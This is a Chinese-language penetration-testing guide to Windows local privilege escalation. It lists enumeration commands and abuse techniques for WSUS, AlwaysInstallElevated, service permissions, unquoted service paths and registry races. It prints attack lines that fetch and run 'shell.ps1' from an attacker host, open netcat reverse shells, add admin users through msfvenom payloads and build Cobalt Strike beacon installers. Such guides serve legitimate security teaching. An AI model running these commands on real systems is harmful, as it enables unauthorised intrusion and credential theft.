# Windows 本地权限提升

{{#include ../../banners/hacktricks-training.md}}

### **寻找 Windows 本地权限提升向量的最佳工具：** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

本页面整合了多份基础指南中的通用 Windows 权限提升方法论。<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> 其实用的枚举流程还参考了社区 workshop 和检查清单。<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> 其中的历史攻击材料包括 DerbyCon 关于 Windows 权限提升的演讲。<sup>[[5]](#references)</sup>

## Windows 初始理论

### Access Tokens

**如果你不了解 Windows access tokens，请在继续之前阅读以下页面：**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**有关 ACLs - DACLs/SACLs/ACEs 的更多信息，请查看以下页面：**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**如果你不了解 Windows 中的 integrity levels，请在继续之前阅读以下页面：**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows 安全控制

Windows 中存在一些可能会**阻止你枚举系统**、运行可执行文件，甚至**检测你的活动**的因素。在开始权限提升枚举之前，你应该**阅读**以下**页面**，并枚举所有这些**防御** **机制**：


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess 静默提升

通过 `RAiLaunchAdminProcess` 启动的 UIAccess 进程，在绕过 AppInfo secure-path 检查后，可以在不显示提示的情况下达到 High IL。请在此处查看专门的 UIAccess/Admin Protection bypass 工作流：

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation 可被滥用来任意写入 SYSTEM registry（RegPwn）：<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

近期的 Windows 构建版本还引入了一种 **SMB arbitrary-port** LPE 路径：特权本地 NTLM authentication 会通过复用的 SMB TCP connection 被反射：

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## 系统信息

### 版本信息枚举

检查 Windows 版本是否存在任何已知漏洞（同时检查已应用的补丁）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

这个[网站](https://msrc.microsoft.com/update-guide/vulnerability)便于搜索 Microsoft 安全漏洞的详细信息。该数据库包含超过 4,700 个安全漏洞，展示了 Windows 环境所具有的**巨大攻击面**。

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

环境变量中是否保存了任何 credential/Juicy 信息？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell 历史记录
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript 文件

你可以在 [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) 中了解如何启用此功能。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline 执行的详细信息会被记录，包括已执行的命令、命令调用以及脚本的部分内容。不过，可能不会捕获完整的执行详细信息和输出结果。

要启用此功能，请按照文档中“Transcript files”部分的说明进行操作，并选择 **“Module Logging”**，而不是 **“Powershell Transcription”**。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
要查看 PowersShell 日志中的最后 15 个事件，可以执行：
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

会捕获脚本执行的完整活动和全部内容记录，确保代码的每个块在运行时都得到记录。此过程保留每项活动的完整审计追踪，有助于取证和分析恶意行为。通过在执行时记录所有活动，可以深入了解整个过程。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block 的日志事件可以在 Windows Event Viewer 中通过以下路径找到：**Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
要查看最近的 20 个事件，可以使用：
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Internet 设置
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 驱动器
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

如果更新不是通过 http**S** 而是通过 http 请求，则可以 compromise 该系统。

首先，在 cmd 中运行以下命令，检查网络是否使用非 SSL 的 WSUS update：
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
或者在 PowerShell 中执行以下命令：
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
如果你收到类似以下内容的回复：
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
并且，如果 `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` 或 `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` 的值等于 `1`。

那么，**它就可以被利用。** 如果最后一个注册表项的值等于 0，则会忽略 WSUS 条目。

为了利用这些漏洞，你可以使用以下工具：[Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS ](https://github.com/GoSecure/pywsus) ——这些是 MiTM weaponized exploit scripts，用于向非 SSL WSUS 流量中注入“fake”更新。

在此处阅读相关研究：

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**在此处阅读完整报告**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
基本上，此漏洞利用的是以下缺陷：

> 如果我们有权修改本地用户代理，并且 Windows Updates 使用 Internet Explorer 设置中配置的代理，那么我们就可以在本地运行 [PyWSUS](https://github.com/GoSecure/pywsus)，拦截自己的流量，并在我们的资产上以提升权限的用户身份执行代码。
>
> 此外，由于 WSUS 服务使用当前用户的设置，它也会使用该用户的证书存储。如果我们为 WSUS 主机名生成一个自签名证书，并将该证书添加到当前用户的证书存储中，就能够拦截 HTTP 和 HTTPS WSUS 流量。WSUS 没有使用类似 HSTS 的机制来实现首次使用时信任（trust-on-first-use）类型的证书验证。如果用户信任所提供的证书，且该证书具有正确的主机名，服务就会接受它。

你可以使用工具 [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) 利用此漏洞（待其 liberated）。

## 第三方 Auto-Updaters 和 Agent IPC（local privesc）

许多企业 Agent 都会暴露 localhost IPC 接口和特权更新通道。如果可以将 enrollment 强制指向攻击者服务器，并且 updater 信任 rogue root CA 或存在薄弱的 signer checks，那么本地用户就可以传送恶意 MSI，由 SYSTEM 服务进行安装。请参阅此处的通用技术（基于 Netskope stAgentSvc chain – CVE-2025-0309）：


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532（通过 TCP 9401 获取 SYSTEM）

Veeam B&R < `11.0.1.1261` 会在 **TCP/9401** 上暴露一个 localhost 服务，该服务会处理攻击者控制的消息，从而允许以 **NT AUTHORITY\SYSTEM** 身份执行任意命令。<sup>[[12]](#references)</sup>

- **Recon**：确认监听器和版本，例如 `netstat -ano | findstr 9401` 以及 `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`。
- **Exploit**：将类似 `VeeamHax.exe` 的 PoC 与所需的 Veeam DLL 放在同一目录中，然后通过本地 socket 触发 SYSTEM payload：
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
该服务以 SYSTEM 身份执行命令。
## KrbRelayUp

在特定条件下，Windows **domain** 环境中存在一个**本地权限提升**漏洞。这些条件包括：环境中未强制执行 **LDAP signing**、用户拥有允许其配置 **Resource-Based Constrained Delegation (RBCD)** 的自有权限，以及用户能够在 domain 中创建计算机。需要注意的是，这些**要求**在默认设置下即可满足。

在 [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) 中查找该 **exploit**。

有关攻击流程的更多信息，请查看 [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**如果**这 2 个注册表项为**启用**状态（值为 **0x1**），那么任何权限级别的用户都可以将 `*.msi` 文件作为 NT AUTHORITY\\**SYSTEM** 进行**安装**（执行）。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```
如果你有一个 meterpreter session，可以使用模块 **`exploit/windows/local/always_install_elevated`** 自动化此技术。

### PowerUP

使用 power-up 中的 `Write-UserAddMSI` 命令，在当前目录中创建一个用于提升权限的 Windows MSI binary。此脚本会写出一个预编译的 MSI installer，并提示添加 user/group（因此你需要 GIU access）：
```
Write-UserAddMSI
```
只需执行创建的 binary 即可提升权限。

### MSI Wrapper

阅读本教程，了解如何使用这些 tools 创建 MSI wrapper。注意，如果你**只**想**执行****命令行**，也可以封装一个 "**.bat**" 文件。


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- 使用 Cobalt Strike 或 Metasploit 在 `C:\privesc\beacon.exe` 中**生成**一个**新的 Windows EXE TCP payload**
- 打开 **Visual Studio**，选择 **Create a new project**，然后在搜索框中输入 "installer"。选择 **Setup Wizard** 项目，并点击 **Next**。
- 为项目指定一个名称，例如 **AlwaysPrivesc**，将位置设为 **`C:\privesc`**，选择 **place solution and project in the same directory**，然后点击 **Create**。
- 持续点击 **Next**，直到进入第 4 步中的第 3 步（选择要包含的文件）。点击 **Add**，并选择刚刚生成的 Beacon payload。然后点击 **Finish**。
- 在 **Solution Explorer** 中突出显示 **AlwaysPrivesc** 项目，并在 **Properties** 中将 **TargetPlatform** 从 **x86** 更改为 **x64**。
- 还可以更改其他属性，例如 **Author** 和 **Manufacturer**，使安装的 app 看起来更合法。
- 右键点击项目，选择 **View > Custom Actions**。
- 右键点击 **Install**，然后选择 **Add Custom Action**。
- 双击 **Application Folder**，选择 **beacon.exe** 文件，然后点击 **OK**。这样可以确保 installer 运行后立即执行 beacon payload。
- 在 **Custom Action Properties** 下，将 **Run64Bit** 更改为 **True**。
- 最后，**build** 它。
- 如果出现警告 `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`，请确认已将平台设置为 x64。

### MSI Installation

要在**后台**执行恶意 `.msi` 文件的**安装**：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
要利用此漏洞，你可以使用：_exploit/windows/local/always_install_elevated_

## 防病毒软件和检测器

### 审计设置

这些设置决定哪些内容会被**记录**，因此你应当注意。
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding，了解日志发送到哪里很有用
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** 用于**管理本地 Administrator 密码**，确保加入域的计算机上的每个密码都**唯一、随机且定期更新**。这些密码会安全地存储在 Active Directory 中，只有通过 ACL 获得足够权限的用户才能访问，从而在获得授权后查看本地 admin 密码。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

如果处于启用状态，**明文密码会存储在 LSASS**（Local Security Authority Subsystem Service）中。\
[**本页面中有关 WDigest 的更多信息**](../stealing-credentials/credentials-protections.md#wdigest)。
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

从 **Windows 8.1** 开始，Microsoft 为 Local Security Authority (LSA) 引入了增强保护，以**阻止**不受信任的进程尝试**读取其内存**或注入代码，从而进一步保护系统。\
[**此处了解有关 LSA Protection 的更多信息**](../stealing-credentials/credentials-protections.md#lsa-protection)。
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** 于 **Windows 10** 中引入。其目的是保护设备上存储的凭据，防范 pass-the-hash attacks 等威胁。[**此处提供了有关 Credential Guard 的更多信息。**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### 缓存凭据

**域凭据**由**本地安全机构**（LSA）进行身份验证，并由操作系统组件使用。当用户的登录数据通过已注册的安全包进行身份验证后，通常会为该用户建立域凭据。\
[**有关缓存凭据的更多信息**](../stealing-credentials/credentials-protections.md#cached-credentials)。
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## 用户和组

### 枚举用户和组

你应该检查你所属的组是否具有任何有趣的权限
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特权组

如果你**属于某个特权组，可能可以提升权限**。在此了解特权组，以及如何滥用它们来提升权限：


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token 操作

在此页面了解更多关于 **token** 的信息：[**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
查看以下页面，**了解有趣的 token** 以及如何滥用它们：


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### 已登录用户 / 会话
```bash
qwinsta
klist sessions
```
### 主文件夹
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### 密码策略
```bash
net accounts
```
### 获取剪贴板内容
```bash
powershell -command "Get-Clipboard"
```
## 正在运行的进程

### 文件和文件夹权限

首先，在列出进程时，**检查进程命令行中是否包含密码**。\
检查是否可以**覆盖某个正在运行的二进制文件**，或者是否拥有该二进制文件所在文件夹的写入权限，以利用潜在的 [**DLL Hijacking attacks**](dll-hijacking/index.html)：
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
始终检查是否有可能正在运行的 [**electron/cef/chromium debuggers**，你可以滥用它来提升权限](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md)。

**检查进程二进制文件的权限**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**检查进程二进制文件所在文件夹的权限（**[**DLL Hijacking**](dll-hijacking/index.html)**）**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### 内存密码提取

你可以使用 sysinternals 中的 **procdump** 创建正在运行的进程的内存转储。FTP 等服务会将**凭据以明文形式保存在内存中**，尝试转储内存并读取凭据。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### 不安全的 GUI 应用程序

**以 SYSTEM 身份运行的应用程序可能允许用户启动 CMD 或浏览目录。**

示例："Windows Help and Support"（Windows + F1），搜索 "command prompt"，点击 "Click to open Command Prompt"

## Services

Service Triggers 允许 Windows 在特定条件发生时启动服务（命名管道/RPC endpoint 活动、ETW 事件、IP 可用性、设备到达、GPO 刷新等）。即使没有 SERVICE_START 权限，通常也可以通过触发其 triggers 来启动特权服务。此处提供枚举和激活技术：

-
{{#ref}}
service-triggers.md
{{#endref}}

获取服务列表：
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 权限

你可以使用 **sc** 获取服务信息
```bash
sc qc <service_name>
```
建议使用 _Sysinternals_ 中的 **accesschk** 二进制文件，以检查每个服务所需的权限级别。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
建议检查“Authenticated Users”是否可以修改任何服务：
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[你可以从这里下载适用于 XP 的 accesschk.exe](https://github.com/ankh2054/windows-pentest/raw/master/Privilege/accesschk-2003-xp.exe)

### 启用服务

如果你遇到此错误（例如使用 SSDPSRV 时）：

_系统错误 1058 已发生。_\
_服务无法启动，原因可能是服务已被禁用，或者没有与其关联的已启用设备。_

你可以使用以下命令启用它
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**请注意，服务 upnphost 依赖 SSDPSRV 才能工作（适用于 XP SP1）**

**此问题的另一种 workaround** 是运行：
```
sc.exe config usosvc start= auto
```
### **修改 service binary path**

在“Authenticated users”组对某个 service 拥有 **SERVICE_ALL_ACCESS** 的情况下，可以修改该 service 的可执行 binary。要修改并执行 **sc**：
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 重启服务
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
权限可通过各种权限进行提升：

- **SERVICE_CHANGE_CONFIG**：允许重新配置服务二进制文件。
- **WRITE_DAC**：启用权限重新配置，从而能够更改服务配置。
- **WRITE_OWNER**：允许获取所有权并重新配置权限。
- **GENERIC_WRITE**：继承更改服务配置的能力。
- **GENERIC_ALL**：同样继承更改服务配置的能力。

可以使用 _exploit/windows/local/service_permissions_ 来检测和利用此漏洞。

### 服务二进制文件权限薄弱

如果服务以 **`LocalSystem`**、**`LocalService`**、**`NetworkService`** 或特权域账户运行，但 **低权限用户可以修改服务 EXE 或其父文件夹**，则通常可以通过 **替换二进制文件并重启服务** 劫持该服务。

**检查是否可以修改服务执行的二进制文件**，或者是否对二进制文件所在的**文件夹**拥有**写入权限**（[**DLL Hijacking**](dll-hijacking/index.html)**。**）\
你可以使用 **wmic**（不在 system32 中）获取服务执行的每个二进制文件，并使用 **icacls** 检查权限：
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
你也可以使用 **sc** 和 **icacls**：
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
查找授予 **`Everyone`**、**`BUILTIN\Users`** 或 **`Authenticated Users`** 的危险 ACL，尤其是服务可执行文件或其所在目录上的 **`(F)`**、**`(M)`** 或 **`(W)`**。一种实用的滥用流程是：<sup>[[27]](#references)</sup>

1. 使用 `sc qc <service_name>` 确认 service account 和可执行文件路径。
2. 使用 `icacls <path>` 确认该 binary 可写。
3. 将 service binary 替换为 payload 或有效的恶意 service binary。
4. 使用 `sc stop <service_name> && sc start <service_name>` 重启服务（或等待 reboot / service trigger）。

实用的自动化检查：<sup>[[28]](#references)</sup>
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> 如果该服务不允许普通用户重启，请检查它是否会在启动时自动启动、是否具有可重新启动它的故障操作，或者是否可以由使用它的应用程序间接触发。

### 服务注册表修改权限

你应该检查是否可以修改任何服务注册表。\
你可以执行以下操作来**检查**你对服务**注册表**的**权限**：
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
应检查 **Authenticated Users** 或 **NT AUTHORITY\INTERACTIVE** 是否拥有 `FullControl` 权限。如果是，则可以修改服务执行的 binary。

要更改所执行 binary 的路径：
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### 注册表符号链接 race：任意 HKLM value write（ATConfig）

某些 Windows Accessibility 功能会创建按用户区分的 **ATConfig** keys，之后由 **SYSTEM** process 复制到 HKLM session key 中。注册表 **symbolic link race** 可以将这一 privileged write 重定向到**任意 HKLM path**，从而获得任意 HKLM **value write** primitive。<sup>[[18]](#references)</sup>

关键位置（示例：On-Screen Keyboard `osk`）：

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` 列出已安装的 Accessibility features。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` 存储由用户控制的 configuration。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` 在 logon/secure-desktop transitions 期间创建，并且用户可写。

Abuse flow（CVE-2026-24291 / ATConfig）：

1. 填充要由 SYSTEM 写入的 **HKCU ATConfig** value。
2. Trigger secure-desktop copy（例如 **LockWorkstation**），启动 AT broker flow。
3. 通过在 `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` 上放置 **oplock** 来 **win the race**；oplock 触发时，将 **HKLM Session ATConfig** key 替换为指向受保护 HKLM target 的 **registry link**。
4. SYSTEM 将 attacker-chosen value 写入重定向后的 HKLM path。

获得任意 HKLM value write 后，可以通过覆盖 service configuration values pivot 到 LPE：

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath`（EXE/command line）
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll`（DLL）

选择普通用户可以启动的 service（例如 **`msiserver`**），并在 write 完成后 trigger it。**注意：**public exploit implementation 会在 race 过程中 **lock the workstation**。

Example tooling（RegPwn BOF / standalone）：<sup>[[19]](#references)</sup>
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

如果你对某个 registry 拥有此权限，这意味着**你可以从该 registry 创建子 registry**。对于 Windows services，这**足以执行任意代码：**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

如果 executable 的路径未包含在引号中，Windows 将尝试执行空格之前的每个结尾部分。

例如，对于路径 _C:\Program Files\Some Folder\Service.exe_，Windows 将尝试执行：
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
列出所有未加引号的服务路径，但排除属于 Windows 内置服务的路径：
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**你可以使用 metasploit 检测并利用**此漏洞：`exploit/windows/local/trusted\_service\_path` 你可以使用 metasploit 手动创建服务二进制文件：
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 恢复操作

Windows 允许用户指定在服务失败时要执行的操作。此功能可以配置为指向某个 binary。如果该 binary 可被替换，则可能实现 privilege escalation。更多详细信息请参阅[官方文档](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)。

## 应用程序

### 已安装的应用程序

检查 **binaries 的权限**（也许你可以覆盖其中一个并实现 privilege escalation）以及**文件夹的权限**（[DLL Hijacking](dll-hijacking/index.html)）。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
